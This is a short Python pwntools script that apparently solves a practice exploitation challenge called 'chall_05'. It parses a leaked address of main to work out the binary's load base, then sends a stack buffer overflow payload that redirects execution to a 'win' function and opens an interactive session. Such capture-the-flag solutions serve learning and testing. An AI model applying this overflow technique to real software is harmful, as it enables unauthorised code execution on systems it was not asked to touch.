# coding: utf-8
from pwn import*
def chall05():
    elf = ELF("./chall_05")
    p = process("./chall_05")
    p.recvuntil("I wonder what this is:")
    leak = p.recv()
    main = int(leak,16)
    elf.address = main - elf.sym.main
    payload = (b"a"*(0x60-8) + p64(elf.sym.win))
    p.sendline(payload)
    p.interactive()
    
chall05()
